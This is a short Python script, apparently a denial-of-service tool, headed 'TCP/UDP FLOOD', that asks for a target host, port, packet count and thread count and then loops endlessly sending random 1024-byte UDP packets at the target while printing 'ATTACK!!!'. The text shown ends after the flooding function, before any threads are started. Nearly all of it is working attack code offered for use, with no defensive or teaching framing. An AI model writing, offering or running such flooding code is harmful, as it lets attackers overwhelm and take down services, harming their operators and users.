#!/usr/bin/env python3

import random
import socket
import threading

print("###########################")
print("###### TCP/UDP FLOOD ######")
print("###########################")
ip = str(input(" HOST/IP:"))
port = int(input(" PORT:"))
choice = str(input(" UDP(Y/N):"))	
times = int(input(" PACKETS PER ONE CONNECTION:"))
threads = int(input(" THREADS:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ATTACK!!!")
		except:
			print("[!] ATTACK!!!")
			
